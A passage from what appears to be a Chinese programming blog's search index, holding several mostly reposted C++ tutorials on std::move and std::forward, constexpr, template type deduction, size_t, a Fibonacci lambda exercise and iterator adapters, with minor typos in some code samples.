std::move吸引人的地方在于它的方便，减少可能的错误，还有更简洁。试想在一个类中，我们要记录移动构造函数被调用了多少次。我们所需要的是个static计数器，它在移动构造中递增。假如类中的非static成员变量只有一个std::string，这里有个十分方便的方法（即使用std::move）实现我们的移动构造： 12345678910class Widget &#123;public: Widget(Widget&amp;&amp; rhs) : s(std::move(rhs.s)) &#123; ++moveCtorCalls; &#125; ...private: static std::size_t moveCtorCalls; std::string s;&#125;; 用std::forward实现相同的效果，代码是这样的： 1234567class Widget &#123;public: Widget(Widget&amp;&amp; rhs) :s(std::forward&lt;std::string&gt;(rhs.s)) &#123; ++moveCtorCalls; &#125; ...&#125;; 首先要注意到的是std::move只需要一个函数参数（rhs.s），而std::forward既需要一个函数参数（rhs.s）又需要一个模板类型参数（std::string）。然后需要注意的是我们一般传递给std::forward的参数类型是不带引用的，那是因为这会很方便把参数编码成右值（看条款28）。结合起来，意味着std::move比起std::forward需要更少的类型，不用传递类型参数可以减少编码的麻烦。它还可以消除我们可能传递的类型错误（例如，std::string&amp;， 使用std::forward的话，会导致成员变量拷贝构造，而不是移动构造）。 最重要的是，std::move是无条件转换，而std::forward只会将绑在右值上的参数转换为右值。这两个操作不一样，第一个操作通常会造成移动，而第二个操作只是传递——转发——一个对象给另一个函数，而保持原来的左值性质或者右值性质。因为这两个行为是不一样的，所以用两个不同的函数（和函数名）区分它们是很好的设计。 总结需要记住的3点： std::move表现为无条件的右值转换，就其本身而已，它不会移动任何东西。 std::forward仅当参数被右值绑定时，才会把参数转换为右值。 std::move和std::forward在运行时不做任何事情。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"转载","slug":"转载","permalink":"http://coordinate.wang/tags/转载/"},{"name":"move","slug":"move","permalink":"http://coordinate.wang/tags/move/"},{"name":"forward","slug":"forward","permalink":"http://coordinate.wang/tags/forward/"}]},{"title":"尽可能使用constexpr","slug":"2017-06-21-尽可能使用constexpr","date":"2017-06-20T16:00:00.000Z","updated":"2018-02-18T03:29:06.837Z","comments":true,"path":"2017/06/21/2017-06-21-尽可能使用constexpr/","link":"","permalink":"http://coordinate.wang/2017/06/21/2017-06-21-尽可能使用constexpr/","excerpt":"","text":"以下内容转自尽可能使用constexpr 如果要选出C++11中最让人迷惑的新关键字，那么大概是constexpr。当constexpr用于对象时，它本质上就是加强版的const，但它用于函数时，它拥有不同的意思。constexpr再迷惑，也是值得的，因为当constexpr与你想要表达的一致时，你肯定会用它。在概念上，constexpr表明一个值不仅是常量，还是在编译期间可知。这概念只是拼图的一部分，因为当constexpr用于函数时，有点微妙的区别。免得我破坏了最后的惊喜，我现在只可以说，你不能假定constexpr函数的返回结果是const的，也不能理所当然的人物它们的返回值在编译期间可知。可能会很有趣，这些特性。constexpr函数不需要返回const结果和编译器可知结果，这是有益的。 不过我们还是先讲constexpr对象，这些对象呢，事实上和const一样，它们的值在编译期间就知道了。那些在编译期间就可知的值是享有特权的。例如，它们可能存放在只读的内存区域中，特别是为那些内嵌系统的开发者，这是一个相当重要的特性。在C++的上下文中需要一个整型常量表达式(integral constant expression)时，一个常量的和编译期间可知的整型数具有广泛适应性。这种上下文包括数组大小的表示，整型模板参数（包括std::array对象的长度），枚举的值，对齐说明，等等。如果你想要一个变量，用于刚说的东西，那么你肯定想要把那个变量声明为constexpr，因为编译器会确保它在编译期间有值： 123456int sz; // non-constexpr variable...constexpr auto arraySize1 = sz; // 错误，编译期间不知道sz的值std::array&lt;int, sz&gt; data1; // 错误，同样的问题constexpr auto arraySize2 = 10; // 正确，10在编译期间是常量std::array&lt;int, arraySize2&gt; data2; // 正确，arraySize2是constexpr的 请注意const并不提供与constexpr相同的保证，因为const对象在编译时不需要用已知的值初始化： 1234int sz; // 如前...const auto arraySize = sz; // 正确，arraySize是sz的**const**拷贝std::array&lt;int, arraySize&gt; data; // 错误，arraySize的值在编译期间不可知 我们可以简单地认为，所有constexpr对象都是const的，但是不是所有的const对象都是constexpr的。如果你想要编译器保证变量编译期有值，即上下文请求了一个编译期间的常量，那么能用的工具是constexpr，而不是const。当涉及到constexpr函数的时候，constexpr对象的使用会变得更加有趣。当编译期间的常量作为参数传递给constexpr函数时，这种函数会返回编译期间常量。如果函数的参数在运行期间才能知道，函数返回的也是运行时的值。听起来有点乱，正确的规则： constexpr函数可以用在需求编译期间常量的上下文。在这种上下文中，如果你传递参数的值在编译期间已知，那么函数的结果会在编译期间计算。如果任何一个参数的值在编译期间未知，代码将不能通过编译。 如果用一个或者多个在编译期间未知的值作为参数调用constexpr函数，函数的行为和普通的函数一样，在运行期间计算结果。这意味着你不需要用两个函数来表示这个操作——一个在编译期间和一个在运行期间。constexpr函数具有两个动作。 假设我们需要一个数据结构来保存某个实验的结果，这个实验可在不同的条件下进行。例如，在实验期间，光的强度可高可低，风速和温度也可变化。如果与实验有关的环境条件有n个，每个环境变量又有3种状态，那么就有$3^n$种情况。存储实验可能出现的所有结果，就要求数据结构有足够大的空间保存$3^n$个值。假设每个结果是int值，然后n在编译期间已知（或者可计算），那么选择std::array这数据结构将会合情合理。C++标准库提供std::pow，是我们需要的数学计算函数，但这里会有两个问题。第一，std::pow作用于两个浮点型指针，而我们需要的是一个整型结果。第二，std::pow不是constexpr的，所以我们不能用它的结果来指定std::array的值。 幸运的是，我们可以自己写pow函数。等下我会展示它是怎么做的，但我们先看看它是怎样声明和使用的： 12345678constexpr // pow是个constexpr函数int pow(int base, int exp) noexcept // 函数不会抛出引出&#123; ... // 实现看下面&#125;constexpr auto numCouds = 5; // 条件个数std::array&lt;int, pow(3, numCouds)&gt; results; // results有3^n个元素 constexpr在pow并不是说明pow返回const值，它指的是，如果base和exp是编译期间常量，pow的结果可以被用作编译期间常量。如果base和（或）exp不是编译期间常量，pow的结果将会在程序运行时计算，这意味pow不仅可以在编译期间计算std::array的大小，还可以在运行期间的上下文调用： 123auto base = readFromDB(\"base\"); // 在运行期间auto exp = readFromDB(\"exponent\"); // 获取值auto baseToExp = pow(base, exp); // 在运行期间调用pow 因为用编译期间的值作为参数调用constexpr函数一定要返回编译期间的结果，所以会有限制强加于它们的实现。c++11和C++14的限制不同。 在C++11，constexpr只能有一个return语句。听起来不是什么限制，因为可以用两个技巧。第一个是“？：”运算符代替if-else语句，第二个是可以用递归。所以pow可以这样实现： 1234constexpr int pow(int base, int exp) noexcept&#123; return (exp == 0 ? 1 : base * pow(base, exp - 1));&#125; 这可以运行，但是很难想象除了大神还有谁能把它写得这么好。在C++14中，constexpr函数的限制大幅宽松，所以这种函数实现成为可能： 123456constexpr int por(int base, int exp) noexcept&#123; auto result = 1; for (int i=0; i &lt; exp; ++i) result *= base; return result;&#125;; constexpr函数限制持有和返回的类型为字面值类型（literal type），本质上就是一些在编译期间可确定值的类型。在C++中，除了void之外的内置类型都是字面值类型，不过用户定义的类型也有可能是字面值类型，因为构造函数和其他成员函数可能是constexpr的： 123456789101112131415class Point &#123;public: constexpr Point(double xVal = 0, double yVal = 0) noexcept : x(xVal), y(yVal) &#123;&#125; constexpr double xValue() const noexcept &#123; return xVal; &#125; constexpr double yValue() const noexcept &#123; return yVal; &#125; void setX(double newX) noexcept &#123; x = newX; &#125; void setY(double newY) noexcept &#123; y = newY; &#125;private: double x, y;&#125;; 在这里，Point的构造函数可以被声明为constexpr，因为如果传进来的参数在编译时就可以知道，那么由P构造的成员变量的值在编译时也可以被知道。因此Point可以用constexpr初始化 ： 12constexpr Point p1(9.4, 27.7); // 正确，在编译时“运行”constexpr构造constexpr Point p2(28.8, 5.3); // 也正确 同样的，获取函数（getter）xValue和yValue也可以是constexpr，因为如果它们被一个编译期间已知的Point对象调用（例如，一个constexpr的Point对象），成员变量x和y的值在编译时是已知的，这使一个constexpr函数调用Point的获取函数并用其结果来初始化一个constexpr对象成为可能： 12345678constexprPoint midpoint(const Point &amp;p1, const Point &amp;p2) noexcept&#123; return &#123; (p1.xValue + p2.xValue)) / 2, // 调用constexpr (p1.yValue + p2.yValue)) / 2 &#125;; // 成员函数&#125;constexpr auto mid = midpoint(p1, p2); // 用**constexpr**函数的结果 // 初始化constexpr对象。 这很有趣，这意味着对象mid的初始化涉及到构造函数、获取函数、非成员函数的调用，然后创建在只读内存区域！这意味着你可以将一个类似mid.xValue() * 10的表达式用于模板参数或者一个指定枚举值的表达式！这意味着传统意义上，编译期需完成的工作与运行期间需完成的工作之间的严格清晰的线变模糊了，而一些传统意义上运行时的工作可以迁移到编译期。参与迁移的代码越多，软件运行得越快（但是，编译的时间可能变长）。 在C++11，有两个限制因素妨碍把Point的成员变量setX和setY声明为constexpr。第一，它们改变了它们操作的值，然后在C++11，constexpr成员函数是隐式声明为const的。第二，它们的返回类型是void，然后在C++11，void不是字面值类型。都是这两个限制在C++14被解除了，所以在C++14，设置函数（setter）也可以constexpr： 123456789class Point &#123;public: ... constexpr void setX(double newX) noexcept // C++14 &#123; x = newX; &#125; constexpr void setY(double newY) noexcept // C++14 &#123; y = newY; &#125; ...&#125;; 这使得写这奇葩的函数成为可能： 12345678910// 返回p的映像（C++14）constexpr Point reflection(const Point &amp;p) noexcept&#123; Point result; // create non-const Point result.setX(-p.xValue()); result.setY(-p.yValue()); return result;&#125; 用户的代码可能是这样的： 123456constexpr Point p1(9.4, 27.7);constexpr Point p2(28.8, 5.3);constexpr auto mid = midpoint(p1, p2);constexpr auto reflectedMid = // reflectedMid的值是（-19.1, -16.5） reflection(mid); // 而且在编译期间就知道了 本条款的建议是尽可能使用constexpr，然后现在我希望你能很清楚为什么：constexpr对象和constexpr函数比起non-constexpr对象和函数具有更广泛的语境。通过尽可能地使用constexpr，你最大化了对象和函数的可能使用的情况。 注意到constexpr是一个对象或函数接口的一部分是很重要的。constexpr表明“我可以用于需求常量表达式的上下文”，如果你把对象或者函数声明为constexpr，用户就有可能把它用于这种上下文。后来，如果你觉得你使用constexpr是个错误，然后你删除了它，这样就可能造成用户大量代码无法编译（为了调试添加I/O函数会导致这种问题，因为I/O语句通常不允许出现在constexpr函数）。“尽可能使用constexpr”中的“尽可能”是你愿意作出长期的承诺，强行约束着constexpr的对象和函数（这句话太难了，我不知道我的理解有没问题：Part of “whenever possible”in “Use constexpr whenever possible” is your willingness to make a long-term commitment to the constraints it imposes on the objects and functions you apply it to.）。·· 总结需要记住4点： constexpr对象是const的，它需用编译期间已知的值初始化。 constexpr函数在传入编译期已知值作为参数时，会在编译期间生成结果。 constexpr对象和函数比起non-constexpr对象和函数具有更广泛的语境。 constexpr是对象和函数接口的一部分。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"转载","slug":"转载","permalink":"http://coordinate.wang/tags/转载/"},{"name":"constexpr","slug":"constexpr","permalink":"http://coordinate.wang/tags/constexpr/"}]},{"title":"理解模板类型推断","slug":"2017-06-20-理解模板类型推断","date":"2017-06-19T16:00:00.000Z","updated":"2018-02-18T03:29:06.822Z","comments":true,"path":"2017/06/20/2017-06-20-理解模板类型推断/","link":"","permalink":"http://coordinate.wang/2017/06/20/2017-06-20-理解模板类型推断/","excerpt":"","text":"以下内容转自Effective Modern C++ 条款1 理解模板类型推断 C++11的auto自动推断变量的方式是以模板推断为基础的，模板推断的规则也应用在auto上，所以理解掌握模板推断的规则对于我们C++程序员来说很重要。 12template &lt;typename T&gt; void f(ParamType param); 考虑上面的代码，当我们调用上面函数并传入参数expr时 1f(expr); 编译器需要根据expr的来推断两个类型，一个是T， 一个是ParamType，这两个类型通常是不一样的，因为ParamType通常会含有修饰符，例如const，例如以下代码 12345template &lt;typename T&gt;void f(const T&amp; param);int x = 0;f(x); 此时T会被推断为int，而ParamType会被推断为const int &amp; 。 人们会很自然的认为编译器为T推断的类型就是我们传进的参数的类型，用上面的代码表示就是T的类型就是expr的类型，也就是说传进来的x是int的类型，然后T就是int的类型。但这有时候是不对的，类型T的推导不仅仅依赖于expr，也依赖于ParamType。 具体有以下3中情况 ParamType是指针类型或者引用类型，但不是通用引用(universal references)类型 ParamType是通用引用(universal references)类型 ParamType既不是指针类型也不是引用类型 情况1 ParamType 是指针类型或者引用类型，但不是通用引用(universal references)类型这是最简单的一种情况。只需记住以下两点 如果传进来的参数expr 是一个引用类型，忽视引用的部分 通过模式匹配expr 的类型来决定ParamType 的类型从而决定T 的类型（Then pattern-match expr’s type against ParamType to determine T. ） 例子如下 12template &lt;typename T&gt;void f(T&amp; param); 然后我们定义一下变量 12345678int x = 27;const int cx = x;const int &amp;rx = x;// 调用模板函数f(x); // T 的类型为int, ParamType的类型为int&amp;f(cx); // T 的类型为const int, ParamType的类型为const int&amp;f(rx); // T 的类型为const int, ParamType的类型为const int&amp; 值得注意的是f(rx)，rx是引用类型，但是编译器会把引用忽略，然后用去掉引用后的参数类型来匹配T 。如果ParamType为右值引用，推断的原则也是相同。但是如果为const引用，就会与上面的结果有点不一样，参考下面的例子。 12template &lt;typename T&gt;void f(const T&amp; param); 定义的变量和上面的一致 1234567int x = 27;const int cx = x;const int &amp;rx = x; // 一样调用模板函数f(x); // T 的类型为int, ParamType的类型为const int&amp;f(cx); // T 的类型为int, ParamTyp的类型为const int&amp;f(rx); // T 的类型为int, ParamType的类型为const int&amp; 因为我们在定义声明模板的时候参数类型已经认定了是const引用，所以T 的类型不再需要推断出const。而rx的引用依旧被忽略。 如果把引用换成指针，原则基本一致，把expr的指针类型忽略，例子如下 123456template &lt;typename T&gt;void f(T* param);int x = 27;const int *px = &amp;x;f(&amp;x); // T的类型为int，ParamType 的类型为int*f(px); // T的类型为const int，ParamType的类型为const int* 情况2 ParamType 是通用引用(universal references)类型首先要知道什么是universal references，可以google或者baidu，懒得搜索的可以直接看这里。简单来说就是type&amp;&amp; + syntax + type deduction，即可以引用左值，也可以引用右值。这种情况也有两个原则 如果expr是一个左值，那么T和ParamType会被推断为左值引用 如果expr是一个右值，那么会用正常的推断方式(情况1) 可以看以下代码 1234567891011template &lt;typename T&gt;void f(T&amp;&amp; param);int x = 27;const int cx = x;const int &amp;rx = x;f(x); // x是左值，所以T 和ParamType会被推断为int &amp;类型f(cx); // cx是左值，所以T和ParamType会被推断为const int &amp;类型f(rx); // rx是左值，所以T和 ParamType会被推断为const int &amp;类型f(27);` // 27是右值，根据情况1，T的类型会被推断为int、ParamType会被推断为int &amp;&amp; 情况3 ParamType 既不是指针类型也不是引用类型如果ParamType 既不是指针也不是引用，那么参数是通过值传递(pass-by-value)的 12template &lt;typename T&gt;void f(T param); // 此处会有拷贝(构造) T 的类型推断主要依赖于传进来的参数expr 如果expr的类型是引用类型，那么忽略引用 通过了上面的检测(无论是不是引用类型)后，如果expr 的类型是const的，把const也忽略了，还会忽略volatile。 给出下面的例子 123int x = 27;const int cx = x;const int &amp;rx = x; 和之前的例子一样 123f(x); // 易知T和ParamType的类型都是intf(cx); // 忽略const，T和ParamType的类型都是intf(rx);` // 忽略了引用后再忽略const,T和ParamType的类型都是int 虽说cx和rx都是const修饰的，但是param是值语义，所以param只是拷贝了cx和rx的值，并可以改变值。这就是为什么会忽略const，因为传进的参数expr 尽管不可以改变值，但并不意味着他们的拷贝不可以。 如果我们定义一个指向常量的常量指针 1const char* const ptr = \"Fun with pointers\"; 然后调用函数 1f(ptr); 这个时候T 和 ParamType的类型会被推断为const char *，这是因为这种情况下传入的参数都会被函数拷贝并可以改变的，所以指针是可以指向不同的地址，个人理解在情况3是只会忽略 顶层const，然后保留 底层const。 数组作为参数在情况3下，如果传入的参数是数组，会转化为指针类型，例如 12const char name[] = \"J. R. Briggs\"; // name的类型是const char[13] f(name); // T会被推断为 const char * 但在情况1下 12template &lt;typename T&gt; void f(T&amp; param); 我们把数组作为参数传入函数 1f(name); // T 的类型会被推断为const char [13] 这个时候T 的类型会被推断为有长度的数组，在这个例子中T 的类型会被推断为const char [13]，ParamType的类型会是 const char (&amp;) [13]在这里引用一段书中的原话，这规则有毒…. Yes, the syntax looks toxic, but knowing it will score you mondo points with those few souls who care.是的，语法看起来很有毒，但是知道它会让你与那些关心的少数灵魂分享你的意见。 利用这个特性可以写一个模板，用来返回数组的长度 12345template &lt;typename T, std::size_t N&gt;constexpr std::size_t arraySize(T (&amp;)[N]) noexcept&#123; return N;&#125; 因为这个模板函数是constexpr修饰的，所以他的结果可以在编译时期得到，所以可以用来初始化变量。 另外关于constexpr可以看这篇《尽可能使用constexpr》 函数作为参数因为函数像数组一样可以转化为指针，所以函数作为参数与数组类似，例子如下 1234567891011void someFunc(int, double); template &lt;typename T&gt; void f1(T param); template &lt;typename T&gt; void f2(T&amp; param);f1(someFunc); // 传值，ParamType 类型为void (*)(int, double)，情况3f2(someFunc); // 引用语义，ParamType类型为void (&amp;)(int, double)，情况1 总结auto的规则与模板类型推断有很大关联，这在一开始已经说了，是理解auto的前提。 要记住的4点 在模板类型推断过程中，参数的引用语义会被忽略 在通用引用(universal reference)类型推断时，左值引用会被特别对待 在传值类型的模板推断过程中，const 和 volatile的参数会以non-const 和 non-volatile 对待。 在模板类型推断过程中，如果参数是数组或者函数，他们被转化为对应的指针，除非模板参数类型一开始就是引用。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"转载","slug":"转载","permalink":"http://coordinate.wang/tags/转载/"},{"name":"auto","slug":"auto","permalink":"http://coordinate.wang/tags/auto/"}]},{"title":"为什么size_t重要？（Why size_t matters）","slug":"2017-06-19-为什么size_t重要？（Why-size_t-matters）","date":"2017-06-18T16:00:00.000Z","updated":"2018-02-18T03:29:06.806Z","comments":true,"path":"2017/06/19/2017-06-19-为什么size_t重要？（Why-size_t-matters）/","link":"","permalink":"http://coordinate.wang/2017/06/19/2017-06-19-为什么size_t重要？（Why-size_t-matters）/","excerpt":"","text":"转载自Jeremy’s Blog之前在《内存拷贝的注意事项》一文中提到过size_t，可能许多人对这个类型不太熟悉没有用过或者根本不敢去用，最近看到一篇文章对这个类型讲的比较详细，便翻译过来让不熟悉的同学可以知道它产生的原因以及如何使用。 原文地址： Why size_t matters 前言：使用size_t可能会提高代码的可移植性、有效性或者可读性，或许同时提高这三者。 在标准C库中的许多函数使用的参数或者返回值都是表示的用字节表示的对象大小，比如说malloc(n) 函数的参数n指明了需要申请的空间大小，还有memcpy(s1, s2, n)的最后一个参数，表明需要复制的内存大小，strlen(s)函数的返回值表明了以’\\0’结尾的字符串的长度（不包括’\\0’），其返回值并不是该字符串的实际长度，因为要去掉’\\0’。 或许你会认为这些参数或者返回值应该被申明为int类型（或者long或者unsigned），但是事实上并不是。C标准中将他们定义为size_t。标准中记载malloc的申明应该出现在，定义为： 1void *malloc(size_t n); memcpy和strlen的申明应该出现在中：12void *memcpy(void *s1, void const *s2, size_t n);size_t strlen(char const *s); size_t还经常出现在C++标准库中，此外，C++库中经常会使用一个相似的类型size_type，用的可能比size_t还要多。 据我所知，大部分的C和C++程序员害怕这些库使用size_t，因为他们不知道size_t代表什么或者为什么这些库需要使用它，归根结底，原因在于他们什么时候什么地方需要用到它。 可移植性问题 早期的C语言（由Brian Kernighan 和 Dennis Ritchie 在The C Programming Language书中所写，Prentice-Hall, 1978）并没有提供size_t类型，C标准委员会为了解决移植性问题将size_t引入，举例如下： 让我们来写一个可移植的标准memcpy函数，我们将会看到一些不同的申明和它们在不同平台不同大小的地址空间上编译下的情况。 回忆memcpy(s1, s2, n)函数，它将s2指向地址开始的n个字节拷贝到s2指向的地址，返回s1，这个函数可以拷贝任何数据类型，所以参数和返回值的类型应该为可以指向任何类型的void*，同时，源地址不应该被改变，所以第二个参数s2类型应该为const void*，这些都不是问题。 真正的问题在于我们如何申明第三个参数，它代表了源对象的大小，我相信大部分程序员都会选择int：1void *memcpy(void *s1, void const *s2, int n); 使用int类型在大部分情况下都是可以的，但是并不是所有情况下都可以。int是有符号的，它可以表示负数，但是，大小不可能是复数。所以我们可以使用unsigned int代替它让第三个参数表示的范围更大。 在大部分机器上，unsigned int的最大值要比int的最大值大两倍，比如说再也给16位的机器上，unsigned int的最大值为65535，int的最大值为32767。 尽管int类型的大小依赖于C编译器的实现，但是在给定的平台上int对象的大小和unsigned int对象的大小是一样的。因此，使用unsigned int修饰第三个参数的代价与int是相同的： 1void *memcpy(void *s1, void const *s2, unsigned int n); 这样似乎没有问题了，unsigned int可以表示最大类型的对象大小了，这种情况只有在整形和指针类型具有相同大小的情况下，比如说在IP16中，整形和指针都占2个字节（16位），而在IP32上面，整形和指针都占4个字节（32位）。（参见下面C数据模型表示法） 123456C数据模型表示法 最近，我偶然发现几篇文章，他们使用简明的标记来表述不同目标平台下c语言数据的实现。我还没有找到这个标记的来源，正式的语法，甚至连名字都没有，但他似乎很简单，即使没有正规的定义也可以很容易使用起来。这些标记的一边形式形如： I nI L nL LL nLL P nP。 其中每个大写字母（或成对出现）代表一个C的数据类型，每一个对应的n是这个类型包含的位数。I代表int，L代表long，LL代表long long，以及P代表指针（指向数据，而不是函数）。每个字母和数字都是可选的。 例如，I16P32架构支持16位int和32位指针类型，没有指明是否支持long或者long long。如果两个连续的类型具有相同的大小，通常省略第一个数字。例如，你可以将I16L32P32写为I16LP32，这是一个支持16位int，32位long，和32位指针的架构。 标记通常把字母分类在一起，所以可以按照其对应的数字升序排列。例如，IL32LL64P32表示支持32位int，32位long，64位long long和32位指针的架构；然而，通常写作ILP32LL64。 不幸的是，这种memcpy的申明在I16LP32架构上（整形是16-bit 长整形和指针类型时32-bits）显得不够用了，比如说摩托罗拉第一代处理器68000，在这种情况下，处理器可能拷贝的数据大于65535个字节，但是这个函数第三个参数n不能处理这么大的数据。 什么？你说很容易就可以改正？只需要把memcpy的第三个参数的类型修改一下：1void *memcpy(void *s1, void const *s2, unsigned long n); 你可以在I16LP32目标架构上使用这个函数了，它可以处理更大的数据。而且在IP16和IP32平台上效果也还行，说明它确实给出了memcpy的一种移植性较好的申明。但是，在IP16平台上相比于使用unsigned int，你使用unsigned long可能会使你的代码运行效率大打折扣（代码量变大而且运行变慢）。 在标准C中规定，长整形（无论无符号或者有符号）至少占用32位，因此在IP16平台上支持标准C的话，那么它一定是IP16L32 平台。这些平台通常使用一对16位的字来实现32位的长整形。在这种情况下，移动一个长整形需要两条机器指令，每条移动一个16位的块。事实上，这个平台上的大部分的32位操作都需要至上两条指令。 因此，以可移植性为名将memcpy的第三个参数申明为unsigned long而降低某些平台的性能是我们所不希望看到的。使用size_t可以有效避免这种情况。 size_t类型是一个类型定义，通常将一些无符号的整形定义为size_t，比如说unsigned int或者unsigned long，甚至unsigned long long。每一个标准C实现应该选择足够大的无符号整形来代表该平台上最大可能出现的对象大小。 使用size_t size_t的定义在\\&lt;stddef.h>, \\&lt;stdio.h>, \\&lt;stdlib.h>, \\&lt;string.h>, \\&lt;time.h>和\\&lt;wchar.h>这些标准C头文件中，也出现在相应的C++头文件, 等等中，你应该在你的头文件中至少包含一个这样的头文件在使用size_t之前。 包含以上任何C头文件（由C或C++编译的程序）表明将size_t作为全局关键字。包含以上任何C++头文件（当你只能在C++中做某种操作时）表明将size_t作为std命名空间的成员。根据定义，size_t是sizeof关键字（注：sizeof是关键字，并非运算符）运算结果的类型。所以，应当通过适当的方式声明n来完成赋值： 1n = sizeof(thing); 考虑到可移植性和程序效率，n应该被申明为size_t类型。类似的，下面的foo函数的参数也应当被申明为sizeof： 1foo(sizeof(thing)); 参数中带有size_t的函数通常会含有局部变量用来对数组的大小或者索引进行计算，在这种情况下，size_t是个不错的选择。 适当地使用size_t还会使你的代码变得如同自带文档。当你看到一个对象声明为size_t类型，你马上就知道它代表字节大小或数组索引，而不是错误代码或者是一个普通的算术值。","categories":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/categories/c/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"转载","slug":"转载","permalink":"http://coordinate.wang/tags/转载/"}]},{"title":"使用lambda实现Fibonacci","slug":"2017-06-18-使用lambda实现Fibonacci","date":"2017-06-17T16:00:00.000Z","updated":"2018-02-18T03:29:06.806Z","comments":true,"path":"2017/06/18/2017-06-18-使用lambda实现Fibonacci/","link":"","permalink":"http://coordinate.wang/2017/06/18/2017-06-18-使用lambda实现Fibonacci/","excerpt":"","text":"Fibonacci数列是一个整数序列0、1、1、2、3、5、8、13、21……，头两个数后面的每个整数都是它前面两个整数的和。写一个程序，用lambda表达式生成50个Fibonacci数来初始化array\\&lt;T,N>容器。在程序中用全局函数将容器元素每8个一行输出。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt; // For standard streams#include &lt;iomanip&gt;#include &lt;array&gt; // For array&lt;T,N&gt;using namespace std;int main()&#123; array&lt;size_t, 50&gt; data; size_t x1&#123;&#125;; size_t x2&#123; 1 &#125;; size_t i&#123;&#125;; size_t fib&#123;&#125;; //不错的解法，但是与题意有一些不符，数列不是从0开始的 //generate(begin(data), end(data), // [a = 0, b = 1]() mutable &#123; // a = exchange(b, a + b); // return a; //&#125;); generate(begin(data), end(data), [i, x1, x2, fib]() mutable &#123; if (0 == i) &#123; ++i; return (size_t)0; &#125; else if (1 == i) &#123; ++i; return (size_t)1; &#125; else &#123; fib = x1 + x2; x1 = x2; x2 = fib; return fib; &#125; &#125;); for (int i = 0; i &lt; 50; ++i) &#123; cout &lt;&lt; setw(12) &lt;&lt; data.at(i) &lt;&lt; \" \"; if ((i + 1) % 8 == 0) &#123; cout &lt;&lt; endl; &#125; &#125; system(\"pause\");&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"Fibonacci","slug":"Fibonacci","permalink":"http://coordinate.wang/tags/Fibonacci/"},{"name":"array","slug":"array","permalink":"http://coordinate.wang/tags/array/"},{"name":"lambda","slug":"lambda","permalink":"http://coordinate.wang/tags/lambda/"}]},{"title":"基于Kinect的手势识别","slug":"2017-06-07-基于Kinect的手势识别","date":"2017-06-06T16:00:00.000Z","updated":"2018-02-18T03:29:06.784Z","comments":true,"path":"2017/06/07/2017-06-07-基于Kinect的手势识别/","link":"","permalink":"http://coordinate.wang/2017/06/07/2017-06-07-基于Kinect的手势识别/","excerpt":"","text":"1test","categories":[{"name":"toy","slug":"toy","permalink":"http://coordinate.wang/categories/toy/"}],"tags":[{"name":"c#","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"模式识别","slug":"模式识别","permalink":"http://coordinate.wang/tags/模式识别/"},{"name":"人工智能","slug":"人工智能","permalink":"http://coordinate.wang/tags/人工智能/"}]},{"title":"迭代器适配器","slug":"2017-06-03-迭代器适配器","date":"2017-06-02T16:00:00.000Z","updated":"2018-02-18T03:29:06.768Z","comments":true,"path":"2017/06/03/2017-06-03-迭代器适配器/","link":"","permalink":"http://coordinate.wang/2017/06/03/2017-06-03-迭代器适配器/","excerpt":"","text":"Reverse（反向）迭代器你可以将正常的迭代器转化为reverse迭代器。当然，原本那个迭代器必须具有双向移动功能。要注意的是，转换前后的迭代器逻辑位置发生了变化。 12345678910111213141516171819202122232425#include &lt;iterator&gt;#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;int main()&#123; // create list with elements from 1 to 9 vector&lt;int&gt; coll = &#123; 1, 2, 3, 4, 5, 6, 7, 8, 9 &#125;; // find position of element with value 5 vector&lt;int&gt;::const_iterator pos; pos = find (coll.cbegin(), coll.cend(), 5); // print value to which iterator pos refers cout &lt;&lt; \"pos: \" &lt;&lt; *pos &lt;&lt; endl; // convert iterator to reverse iterator rpos vector&lt;int&gt;::const_reverse_iterator rpos(pos); // print value to which reverse iterator rpos refers cout &lt;&lt; \"rpos: \" &lt;&lt; *rpos &lt;&lt; endl;&#125; 程序输出如下： 12pos: 5rpos: 4 这是由于reverse迭代器在设计是做了一个小技巧，他实际倒置“半开原则”。reverse迭代器所定义的区间并不包括起点，反而包括了终点。 Insert（安插型）迭代器123template&lt; class Container &gt;class insert_iterator : public std::iterator&lt; std::output_iterator_tag, void,void,void,void &gt; std::insert_iterator是一个输出迭代器，它被构造，在该位置到一个容器中插入元素指出，由所提供的迭代器，使用容器的insert()每当迭代器（不论是否解除引用或不）被分配到的成员函数。递增std::insert_iterator是一个no-op。general inserter对所有标准容器均使用（只有array和forward list除外），因为那些容器都提供insert成员函数。然而对于associative和unordered容器而言，安插位置只是个提示，因为在这两个容器转给你元素的真正位置视为value而定。安插动作完成后，general inserter获得刚被安插的那个元素的位置。相当于使用下面的语句： 12pos = container.insert(pos, value);++pos; 为什么要将insert的返回值赋给pos？原因在于为了确保迭代器的位置始终有效。如果没有这个复制动作，在deque、vector和string中，该general inserter本身可能会失效。 123template&lt; class Container &gt;class back_insert_iterator : public std::iterator&lt; std::output_iterator_tag, void,void,void,void &gt; std::back_insert_iterator是OutputIterator追加到一个容器，它被构造，使用容器的push_back()每当迭代器（不论是否解除引用或不）被分配到的成员函数。递增std::back_insert_iterator是一个no-op。由于push_back只存在于vector、deque、list和string，所以c++标准库中只有这些容器支持back insert。 123template&lt; class Container &gt;class front_insert_iterator : public std::iterator&lt; std::output_iterator_tag, void,void,void,void &gt; std::front_insert_iterator是输出预先考虑元素的迭代器，它被修建的容器，使用时容器的push_front()成员函数的迭代器（是否解除引用或不）被分配给的。递增std::front_insert_iterator是一个no-op。由于push_front只在deque、list和forward list有实现，所以只有这些容器可以使用。 Stream（串流）迭代器12345template&lt; class T, class CharT = char, class Traits = 